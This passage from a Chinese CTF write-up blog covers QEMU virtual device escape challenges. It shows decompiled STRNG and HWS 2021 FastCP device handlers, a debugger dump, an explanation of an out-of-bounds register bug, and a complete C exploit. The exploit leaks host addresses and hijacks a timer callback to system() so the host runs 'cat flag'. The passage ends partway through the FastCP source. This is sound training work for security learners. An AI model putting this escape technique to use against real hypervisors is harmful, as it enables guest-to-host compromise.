<h4 id="strng-pmio-write"><a href="#strng-pmio-write" class="headerlink" title="strng_pmio_write"></a>strng_pmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">strng_pmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int64_t</span> ms_4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">uint32_t</span> v5; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> &amp;&amp; (opaque-&gt;addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = opaque-&gt;addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;regs[<span class="number">1</span>] = rand();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[<span class="number">3</span>] = rand_r(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[v5] = val;</span><br><span class="line">            <span class="keyword">if</span> ( opaque-&gt;flag )</span><br><span class="line">            &#123;</span><br><span class="line">              ms_4 = qemu_clock_get_ms_4(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">              timer_mod(&amp;opaque-&gt;strng_timer, ms_4 + <span class="number">100</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          srand(val);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;addr = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过对上面四个函数的观察，我们可以发现起都可以通过对<code>regs</code>数组进行越界操作，且<code>strng_pmio_write</code>函数中存在<code>timer</code>的函数调用。因此我们可以通过<code>regs</code>数组的越界操作来实现部分地址的读写操作<br>我们首先来看<code>STRNGState</code>结构体（内容来自<code>sky123</code>师傅的博客）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(STRNGState*)<span class="number">0x5555582a59d0</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  pdev = &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;,</span><br><span class="line">  mmio = &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;,</span><br><span class="line">  pmio = &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;,</span><br><span class="line">  addr = <span class="number">276</span>, </span><br><span class="line">  flag = <span class="number">1</span>, </span><br><span class="line">  regs = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1818321784</span>, <span class="number">99</span>, <span class="number">0</span> &lt;repeats <span class="number">58</span> times&gt;&#125;, </span><br><span class="line">  strng_timer = &#123;</span><br><span class="line">    expire_time = <span class="number">-1</span>, </span><br><span class="line">    timer_list = <span class="number">0x555556a71860</span>, </span><br><span class="line">    cb = <span class="number">0x5555557eec8e</span> &lt;strng_timer&gt;, </span><br><span class="line">    opaque = <span class="number">0x5555582a59d0</span>, </span><br><span class="line">    next = <span class="number">0x0</span>, </span><br><span class="line">    scale = <span class="number">1000000</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>opaque</code>中存放的是<code>STRNGState</code>结构体的地址，而<code>cb</code>则存放着<code>qemu-system</code>的地址，于是我们可以通过<code>regs</code>的溢出来进行泄露<br>接下来就是要考虑怎么劫持程序流。注意到前面<code>strng_pmio_write</code>函数中存在<code>timer</code>的函数调用，其<code>timer_mod</code> 函数会将该定时任务时间设置为 <code>ms_4 + 100</code> ，并且将 <code>opaque-&gt;strng_timer</code> 添加到定时任务。于是我们可以将<code>STRNGState</code>结构体中的<code>cb</code>改为<code>system@plt</code>的地址，然后将<code>opaque</code>改为函数参数的地址，即可实现任意函数的执行</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint32_t</span> value)</span> &#123;</span><br><span class="line">    *((<span class="type">uint32_t</span> *) mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span> *) mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> pmio_mem = <span class="number">0x000000000000c050</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint32_t</span> value)</span> &#123;</span><br><span class="line">    outl(value, pmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> inl(pmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_abread</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    pmio_write(<span class="number">0</span>, offset &lt;&lt; <span class="number">2</span>);  <span class="comment">// 设置 opaque-&gt;addr</span></span><br><span class="line">    <span class="type">uint64_t</span> val = pmio_read(<span class="number">4</span>);</span><br><span class="line">    pmio_write(<span class="number">0</span>, (offset + <span class="number">1</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> val | (<span class="number">1ULL</span> * pmio_read(<span class="number">4</span>) &lt;&lt; <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_abwrite</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    pmio_write(<span class="number">0</span>, offset &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>, value &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    pmio_write(<span class="number">0</span>, (offset + <span class="number">1</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>, value &gt;&gt; <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> cmd[] = <span class="string">&quot;cat flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cmd); i += <span class="number">4</span>) &#123;</span><br><span class="line">        mmio_write(<span class="number">4</span> + i / <span class="number">4</span>, *(<span class="type">uint32_t</span> *) &amp;cmd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to set io permission.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> arg_addr = pmio_abread(<span class="number">70</span>) + <span class="number">0xb08</span>;</span><br><span class="line">    <span class="type">size_t</span> elf_base = pmio_abread(<span class="number">68</span>) - <span class="number">0x29ac8e</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] arg addr: %p\n&quot;</span>, arg_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] elf base: %p\n&quot;</span>, elf_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] STRNGState addr: %p\n&quot;</span>, arg_addr - <span class="number">0xb08</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> system_plt = elf_base + <span class="number">0x200d50</span>;</span><br><span class="line"></span><br><span class="line">    pmio_abwrite(<span class="number">70</span>, arg_addr);</span><br><span class="line">    pmio_abwrite(<span class="number">68</span>, system_plt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="HWS-2021-FastCP"><a href="#HWS-2021-FastCP" class="headerlink" title="[HWS 2021] FastCP"></a>[HWS 2021] FastCP</h2><h3 id="关键源码"><a href="#关键源码" class="headerlink" title="关键源码"></a>关键源码</h3><h4 id="fastcp-mmio-read"><a href="#fastcp-mmio-read" class="headerlink" title="fastcp_mmio_read"></a>fastcp_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">fastcp_mmio_read</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">8</span> &amp;&amp; addr &lt;= <span class="number">0x1F</span> || addr &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_src;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !addr )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;handling;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( addr != <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;cp_state.cmd;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="fastcp-mmio-write"><a href="#fastcp-mmio-write" class="headerlink" title="fastcp_mmio_write"></a>fastcp_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">fastcp_mmio_write</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int64_t</span> ns; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (size == <span class="number">8</span> || addr &gt; <span class="number">0x1F</span>) &amp;&amp; addr &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">        opaque-&gt;cp_state.CP_list_cnt = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;cp_state.cmd = val;</span><br><span class="line">        ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">        timer_mod(&amp;opaque-&gt;cp_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;cp_state.CP_list_src = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="fastcp-cp-timer"><a href="#fastcp-cp-timer" class="headerlink" title="fastcp_cp_timer"></a>fastcp_cp_timer</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">fastcp_cp_timer</span><span class="params">(FastCPState *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">uint64_t</span> CP_list_cnt; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">uint64_t</span> v4; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">uint64_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">uint64_t</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">bool</span> v7; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">uint64_t</span> v8; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  FastCP_CP_INFO cp_info; <span class="comment">// [rsp+0h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+38h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;cp_info, <span class="number">0</span>, <span class="keyword">sizeof</span>(cp_info));</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);<span class="comment">// 从opaque-&gt;cp_list_src中读取0x18字节数据到cp_info中</span></span><br><span class="line">        <span class="keyword">if</span> ( cp_info.CP_cnt &lt;= <span class="number">0x1000</span> )</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">        cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            msi_notify(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;                          <span class="comment">// handling = 0</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">      CP_list_cnt = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( CP_list_cnt &gt; <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="number">3</span> * v8++;</span><br><span class="line">          cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="number">8</span> * v9, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( opaque-&gt;cp_state.CP_list_cnt &gt; v8 );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !CP_list_cnt )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">          v6 = cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">          opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">0LL</span>;</span><br><span class="line">        v4 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          cpu_physical_memory_rw(v3 + opaque-&gt;cp_state.CP_list_src, buf, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v12 &gt; <span class="number">0x1000</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">          ++v4;</span><br><span class="line">          v3 += <span class="number">24LL</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v4 &gt;= v5 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !v5 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  opaque-&gt;cp_state.cmd = <span class="number">0LL</span>;</span><br><span class="line">LABEL_16:</span><br><span class="line">  opaque-&gt;handling = <span class="number">0</span>;</span><br><span 